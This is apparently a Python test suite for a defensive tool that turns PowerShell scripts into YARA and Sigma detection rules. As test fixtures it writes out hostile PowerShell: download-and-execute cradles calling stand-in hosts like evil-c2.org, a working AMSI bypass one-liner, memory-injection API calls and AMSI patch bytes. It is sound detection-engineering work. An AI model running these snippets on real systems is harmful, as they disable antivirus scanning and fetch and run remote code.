"""
Comprehensive Test Suite for YARA and Sigma Threat Hunting Rule Generation.
Verifies indicator extraction, rule synthesis, condition logic, YAML formatting,
deobfuscator engine integration, and CLI invocation.
"""

import json
import os
import shutil
import tempfile
import unittest

from src.deobfuscator_engine import PowerShellDeobfuscator
from src.indicator_extractor import PowerShellIndicatorExtractor
from src.rule_models import (
    IndicatorCategory,
    MitreAttackCatalog,
    RuleMetadata,
    RuleSeverity,
    RuleStatus,
    RuleSynthesisOptions,
    ThreatIndicator,
)
from src.sigma_generator import SigmaRuleGenerator
from src.threat_rule_generator import (
    ThreatRuleGenerator,
    generate_sigma_rule,
    generate_threat_rules,
    generate_yara_rule,
)
from src.yara_generator import YaraRuleGenerator


class TestRuleModels(unittest.TestCase):
    """Verifies threat hunting data models, enums, and MITRE taxonomies."""

    def test_indicator_category_enum(self):
        self.assertEqual(IndicatorCategory.NETWORK_C2.value, "network_c2")
        self.assertEqual(IndicatorCategory.DEFENSE_EVASION.value, "defense_evasion")
        self.assertEqual(IndicatorCategory.EXECUTION_CRADLE.value, "execution_cradle")
        self.assertEqual(IndicatorCategory.MEMORY_INJECTION.value, "memory_injection")

    def test_threat_indicator_to_dict(self):
        ind = ThreatIndicator(
            category=IndicatorCategory.NETWORK_C2,
            value="http://threat.example.org/payload.ps1",
            indicator_type="url",
            weight=9.5,
            description="Carved remote payload C2 URL",
            mitre_techniques=["T1071.001", "T1105"],
            is_deobfuscated_only=True,
        )
        d = ind.to_dict()
        self.assertEqual(d["category"], "network_c2")
        self.assertEqual(d["value"], "http://threat.example.org/payload.ps1")
        self.assertEqual(d["weight"], 9.5)
        self.assertTrue(d["is_deobfuscated_only"])
        self.assertIn("T1071.001", d["mitre_techniques"])

    def test_mitre_attack_catalog(self):
        name, tactic = MitreAttackCatalog.get_info("T1562.001")
        self.assertIn("Impair Defenses", name)
        self.assertEqual(tactic, "defense-evasion")

        tag = MitreAttackCatalog.format_tag("T1562.001")
        self.assertEqual(tag, "attack.t1562.001")

    def test_rule_metadata_defaults(self):
        meta = RuleMetadata(
            rule_name="Test_Rule",
            title="Test Rule Title",
            description="Test Description",
        )
        self.assertEqual(meta.severity, RuleSeverity.HIGH)
        self.assertEqual(meta.status, RuleStatus.EXPERIMENTAL)
        d = meta.to_dict()
        self.assertEqual(d["rule_name"], "Test_Rule")
        self.assertEqual(d["severity"], "high")

    def test_rule_synthesis_options_deterministic_uuid(self):
        opts = RuleSynthesisOptions()
        uuid1 = opts.compute_rule_id("payload_hash_123")
        uuid2 = opts.compute_rule_id("payload_hash_123")
        uuid3 = opts.compute_rule_id("payload_hash_456")
        self.assertEqual(uuid1, uuid2)
        self.assertNotEqual(uuid1, uuid3)
        self.assertEqual(len(uuid1), 36)


class TestPowerShellIndicatorExtractor(unittest.TestCase):
    """Verifies multi-pass indicator extraction across raw and deobfuscated scripts."""

    def setUp(self):
        self.extractor = PowerShellIndicatorExtractor()

    def test_extract_network_c2_url(self):
        script = "(New-Object Net.WebClient).DownloadString('http://198.51.100.42:8080/beacon.ps1')"
        indicators = self.extractor.extract_indicators(script)
        urls = [i for i in indicators if i.category == IndicatorCategory.NETWORK_C2 and i.indicator_type == "url"]
        self.assertTrue(len(urls) >= 1)
        self.assertIn("http://198.51.100.42:8080/beacon.ps1", [u.value for u in urls])

    def test_extract_amsi_bypass_signature(self):
        script = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        indicators = self.extractor.extract_indicators(script)
        evasion = [i for i in indicators if i.category == IndicatorCategory.DEFENSE_EVASION]
        self.assertTrue(len(evasion) >= 1)
        values = [e.value for e in evasion]
        self.assertTrue("amsiInitFailed" in values or "AmsiUtils" in values)

    def test_extract_memory_injection_apis(self):
        script = "$addr = [VirtualAlloc]::Invoke(0, 1024, 0x3000, 0x40); [VirtualProtect]::Invoke($addr, 1024, 0x20, [ref]0)"
        indicators = self.extractor.extract_indicators(script)
        mem = [i for i in indicators if i.category == IndicatorCategory.MEMORY_INJECTION]
        values = [m.value for m in mem]
        self.assertIn("VirtualAlloc", values)
        self.assertIn("VirtualProtect", values)

    def test_extract_execution_cradles(self):
        script = "iex (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
        indicators = self.extractor.extract_indicators(script)
        cradles = [i for i in indicators if i.category == IndicatorCategory.EXECUTION_CRADLE]
        values = [c.value for c in cradles]
        self.assertIn("DownloadString", values)

    def test_extract_crypto_and_compression(self):
        script = "$stream = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)"
        indicators = self.extractor.extract_indicators(script)
        crypto = [i for i in indicators if i.category == IndicatorCategory.CRYPTO_OBFUSCATION]
        values = [c.value for c in crypto]
        self.assertIn("IO.Compression.DeflateStream", values)

    def test_extract_target_identifiers(self):
        script = '$path = "$env:TEMP\\malware_drop.exe"; Start-Process $path'
        indicators = self.extractor.extract_indicators(script)
        targets = [i for i in indicators if i.category == IndicatorCategory.TARGET_IDENTIFIER]
        self.assertTrue(any("malware_drop.exe" in t.value for t in targets))

    def test_deobfuscated_only_tracking(self):
        raw = "'h'+'ttp://malicious.org/update.ps1'"
        deobf = "'http://malicious.org/update.ps1'"
        indicators = self.extractor.extract_indicators(raw, deobfuscated_script=deobf)
        c2 = [i for i in indicators if i.value == "http://malicious.org/update.ps1"]
        self.assertTrue(len(c2) >= 1)
        self.assertTrue(c2[0].is_deobfuscated_only)

    def test_stopwords_and_noise_filtering(self):
        script = "if ($true) { Write-Host 'Hello' } else { Write-Output 'World'; [void]$null }"
        indicators = self.extractor.extract_indicators(script)
        values = [i.value.lower() for i in indicators]
        self.assertNotIn("if", values)
        self.assertNotIn("write-host", values)
        self.assertNotIn("true", values)


class TestYaraRuleGenerator(unittest.TestCase):
    """Verifies YARA 4.x rule synthesis, formatting, escaping, and condition generation."""

    def setUp(self):
        self.generator = YaraRuleGenerator()

    def test_basic_yara_rule_generation(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.NETWORK_C2,
                value="http://c2.threat.net/stage2.ps1",
                indicator_type="url",
                weight=9.5,
                description="C2 Payload URL",
                mitre_techniques=["T1071.001"],
            ),
            ThreatIndicator(
                category=IndicatorCategory.DEFENSE_EVASION,
                value="AmsiScanBuffer",
                indicator_type="api",
                weight=9.0,
                description="AMSI scan buffer patch",
                mitre_techniques=["T1562.001"],
            ),
            ThreatIndicator(
                category=IndicatorCategory.EXECUTION_CRADLE,
                value="DownloadString",
                indicator_type="text",
                weight=8.5,
                description="WebClient download cradle",
                mitre_techniques=["T1059.001"],
            ),
        ]
        meta = RuleMetadata(
            rule_name="PowerShell_APT_Downloader",
            title="APT PowerShell Downloader",
            description="Detects staged PowerShell download cradle",
            author="SecOps Analyst",
            payload_sha256="abcdef1234567890",
        )
        rule = self.generator.generate_rule(indicators, metadata=meta)

        self.assertIn("rule PowerShell_APT_Downloader", rule)
        self.assertIn("meta:", rule)
        self.assertIn('author = "SecOps Analyst"', rule)
        self.assertIn('hash = "abcdef1234567890"', rule)
        self.assertIn("strings:", rule)
        self.assertIn('$c2_1 = "http://c2.threat.net/stage2.ps1" ascii wide nocase', rule)
        self.assertIn('$evas_1 = "AmsiScanBuffer" ascii wide nocase', rule)
        self.assertIn('$cradle_1 = "DownloadString" ascii wide nocase', rule)
        self.assertIn("condition:", rule)

        is_valid, errors = self.generator.validate_syntax(rule)
        self.assertTrue(is_valid, f"YARA syntax errors: {errors}")

    def test_yara_string_escaping(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.PERSISTENCE,
                value=r"C:\Windows\Temp\malware.exe",
                indicator_type="text",
                weight=7.5,
                description="Malware drop path",
            ),
            ThreatIndicator(
                category=IndicatorCategory.SUSPICIOUS_API,
                value='Command with "quotes" and \\backslashes\\',
                indicator_type="text",
                weight=6.0,
                description="Quoted string",
            ),
        ]
        rule = self.generator.generate_rule(indicators)
        self.assertIn(r"C:\\Windows\\Temp\\malware.exe", rule)
        self.assertIn(r'Command with \"quotes\" and \\backslashes\\', rule)
        is_valid, errors = self.generator.validate_syntax(rule)
        self.assertTrue(is_valid, f"YARA syntax errors: {errors}")

    def test_yara_hex_pattern_generation(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.DEFENSE_EVASION,
                value="B8 57 00 07 80 C3",
                indicator_type="hex",
                weight=10.0,
                description="AmsiScanBuffer 64-bit patch bytes",
            )
        ]
        rule = self.generator.generate_rule(indicators)
        self.assertIn("{ B8 57 00 07 80 C3 }", rule)
        is_valid, errors = self.generator.validate_syntax(rule)
        self.assertTrue(is_valid, f"YARA syntax errors: {errors}")

    def test_yara_condition_styles(self):
        indicators = [
            ThreatIndicator(IndicatorCategory.NETWORK_C2, "http://evil.com/a.ps1", "url", 9.5, "C2"),
            ThreatIndicator(IndicatorCategory.DEFENSE_EVASION, "AmsiScanBuffer", "api", 9.0, "AMSI"),
        ]

        # Strict style
        opts_strict = RuleSynthesisOptions(yara_condition_style="strict")
        rule_strict = self.generator.generate_rule(indicators, options=opts_strict)
        self.assertIn("all of them", rule_strict)

        # Loose style
        opts_loose = RuleSynthesisOptions(yara_condition_style="loose")
        rule_loose = self.generator.generate_rule(indicators, options=opts_loose)
        self.assertIn("1 of them", rule_loose)

        # Categorized style
        opts_cat = RuleSynthesisOptions(yara_condition_style="categorized")
        rule_cat = self.generator.generate_rule(indicators, options=opts_cat)
        self.assertIn("1 of ($c2*) and 1 of ($evas*)", rule_cat)

    def test_yara_dual_scope_prefixes(self):
        indicators = [
            ThreatIndicator(IndicatorCategory.NETWORK_C2, "http://evil.com/raw.ps1", "url", 9.5, "C2", is_deobfuscated_only=False),
            ThreatIndicator(IndicatorCategory.NETWORK_C2, "http://evil.com/deobf.ps1", "url", 9.5, "C2", is_deobfuscated_only=True),
        ]
        opts_dual = RuleSynthesisOptions(target_scope="dual")
        rule = self.generator.generate_rule(indicators, options=opts_dual)
        self.assertIn("$raw_c2_1", rule)
        self.assertIn("$deobf_c2_1", rule)
        is_valid, errors = self.generator.validate_syntax(rule)
        self.assertTrue(is_valid, f"YARA syntax errors: {errors}")


class TestSigmaRuleGenerator(unittest.TestCase):
    """Verifies SigmaHQ YAML rule synthesis, log sources, and formatting."""

    def setUp(self):
        self.generator = SigmaRuleGenerator()

    def test_basic_scriptblock_sigma_rule(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.NETWORK_C2,
                value="http://attack.example.org/stage1.ps1",
                indicator_type="url",
                weight=9.5,
                description="Payload URL",
                mitre_techniques=["T1071.001", "T1105"],
            ),
            ThreatIndicator(
                category=IndicatorCategory.DEFENSE_EVASION,
                value="amsiInitFailed",
                indicator_type="api",
                weight=9.0,
                description="AMSI init failed flag",
                mitre_techniques=["T1562.001"],
            ),
            ThreatIndicator(
                category=IndicatorCategory.EXECUTION_CRADLE,
                value="DownloadString",
                indicator_type="text",
                weight=8.5,
                description="Download method",
                mitre_techniques=["T1059.001"],
            ),
        ]
        meta = RuleMetadata(
            rule_name="PowerShell_Amsi_C2_Activity",
            title="Suspicious PowerShell AMSI Bypass and C2 Download",
            description="Detects PowerShell execution with AMSI bypass and network download.",
            author="Hunt Team",
            severity=RuleSeverity.CRITICAL,
            payload_sha256="deadbeef12345678",
        )
        yaml_out = self.generator.generate_rule(indicators, metadata=meta)

        self.assertIn("title: Suspicious PowerShell AMSI Bypass and C2 Download", yaml_out)
        self.assertIn("id:", yaml_out)
        self.assertIn("status: experimental", yaml_out)
        self.assertIn("attack.t1059.001", yaml_out)
        self.assertIn("attack.t1562.001", yaml_out)
        self.assertIn("service: powershell", yaml_out)
        self.assertIn("ScriptBlockText|contains:", yaml_out)
        self.assertIn("http://attack.example.org/stage1.ps1", yaml_out)
        self.assertIn("amsiInitFailed", yaml_out)
        self.assertIn("DownloadString", yaml_out)
        self.assertIn("condition:", yaml_out)
        self.assertIn("level: critical", yaml_out)

        is_valid, errors = self.generator.validate_structure(yaml_out)
        self.assertTrue(is_valid, f"Sigma structure errors: {errors}")

    def test_process_creation_logsource(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.DEFENSE_EVASION,
                value="amsiInitFailed",
                indicator_type="api",
                weight=9.0,
                description="AMSI init bypass",
            )
        ]
        opts = RuleSynthesisOptions(sigma_logsource="process_creation")
        yaml_out = self.generator.generate_rule(indicators, options=opts)

        self.assertIn("category: process_creation", yaml_out)
        self.assertIn("selection_img:", yaml_out)
        self.assertIn("CommandLine|contains:", yaml_out)
        self.assertIn("selection_img and", yaml_out)
        is_valid, errors = self.generator.validate_structure(yaml_out)
        self.assertTrue(is_valid, f"Sigma structure errors: {errors}")

    def test_yaml_scalar_quoting(self):
        indicators = [
            ThreatIndicator(
                category=IndicatorCategory.EXECUTION_CRADLE,
                value="[ScriptBlock]::Create($code)",
                indicator_type="text",
                weight=8.0,
                description="ScriptBlock compilation",
            )
        ]
        yaml_out = self.generator.generate_rule(indicators)
        # Should be quoted because it contains brackets and colons
        self.assertIn("'[ScriptBlock]::Create($code)'", yaml_out)
        is_valid, errors = self.generator.validate_structure(yaml_out)
        self.assertTrue(is_valid, f"Sigma structure errors: {errors}")


class TestThreatRuleGeneratorFacade(unittest.TestCase):
    """Verifies the unified ThreatRuleGenerator facade and deobfuscator engine integration."""

    def setUp(self):
        self.threat_gen = ThreatRuleGenerator()
        self.deobfuscator = PowerShellDeobfuscator()

    def test_generate_ruleset_bundle(self):
        script = """
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        $wc = New-Object Net.WebClient
        $payload = $wc.DownloadString('http://192.168.1.50/implant.ps1')
        IEX $payload
        """
        bundle = self.threat_gen.generate_ruleset(script)
        self.assertIn("yara", bundle)
        self.assertIn("sigma", bundle)
        self.assertIn("indicators", bundle)
        self.assertIn("metadata", bundle)
        self.assertIn("summary", bundle)

        self.assertTrue(len(bundle["indicators"]) >= 2)
        self.assertEqual(bundle["summary"]["severity"], "critical")
        self.assertIn("T1562.001", bundle["summary"]["mitre_techniques"])

    def test_save_rules_to_disk(self):
        temp_dir = tempfile.mkdtemp()
        try:
            script = "(New-Object Net.WebClient).DownloadString('http://10.0.0.1/test.ps1')"
            bundle = self.threat_gen.generate_ruleset(script)
            saved = self.threat_gen.save_rules(bundle, temp_dir, base_name="test_threat")

            self.assertTrue(os.path.isfile(saved["yara"]))
            self.assertTrue(os.path.isfile(saved["sigma"]))

            with open(saved["yara"], "r", encoding="utf-8") as f:
                yara_content = f.read()
                self.assertIn("rule ", yara_content)

            with open(saved["sigma"], "r", encoding="utf-8") as f:
                sigma_content = f.read()
                self.assertIn("title: ", sigma_content)
        finally:
            shutil.rmtree(temp_dir)

    def test_deobfuscator_engine_threat_rule_methods(self):
        # Obfuscated script: string concatenation and format operator concealing C2 URL
        obf_script = "$u = 'h'+'ttp://evil-c2.org/'+('{0}.ps1' -f 'beacon'); (New-Object Net.WebClient).DownloadString($u) | iex"

        # Generate YARA rule via deobfuscator engine
        yara_rule = self.deobfuscator.generate_yara_rule(obf_script)
        self.assertIn("rule ", yara_rule)
        self.assertIn("http://evil-c2.org/beacon.ps1", yara_rule)

        # Generate Sigma rule via deobfuscator engine
        sigma_rule = self.deobfuscator.generate_sigma_rule(obf_script)
        self.assertIn("title: ", sigma_rule)
        self.assertIn("http://evil-c2.org/beacon.ps1", sigma_rule)

        # Generate full bundle
        bundle = self.deobfuscator.generate_threat_rules(obf_script)
        self.assertIn("yara", bundle)
        self.assertIn("sigma", bundle)
        self.assertIn("indicators", bundle)


class TestThreatRuleCLI(unittest.TestCase):
    """Verifies CLI execution with threat rule generation flags."""

    def test_cli_generate_yara(self):
        import subprocess

        cmd = [
            "python",
            "-m",
            "src.cli",
            "(New-Object Net.WebClient).DownloadString('http://c2.threat.net/stage.ps1')",
            "--generate-yara",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True)
        self.assertEqual(res.returncode, 0)
        self.assertIn("rule ", res.stdout)
        self.assertIn("http://c2.threat.net/stage.ps1", res.stdout)

    def test_cli_generate_sigma(self):
        import subprocess

        cmd = [
            "python",
            "-m",
            "src.cli",
            "(New-Object Net.WebClient).DownloadString('http://c2.threat.net/stage.ps1')",
            "--generate-sigma",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True)
        self.assertEqual(res.returncode, 0)
        self.assertIn("title: ", res.stdout)
        self.assertIn("http://c2.threat.net/stage.ps1", res.stdout)

    def test_cli_generate_rules_bundle(self):
        import subprocess

        cmd = [
            "python",
            "-m",
            "src.cli",
            "(New-Object Net.WebClient).DownloadString('http://c2.threat.net/stage.ps1')",
            "--generate-rules",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True)
        self.assertEqual(res.returncode, 0)
        data = json.loads(res.stdout)
        self.assertIn("yara", data)
        self.assertIn("sigma", data)
        self.assertIn("summary", data)


if __name__ == "__main__":
    unittest.main()
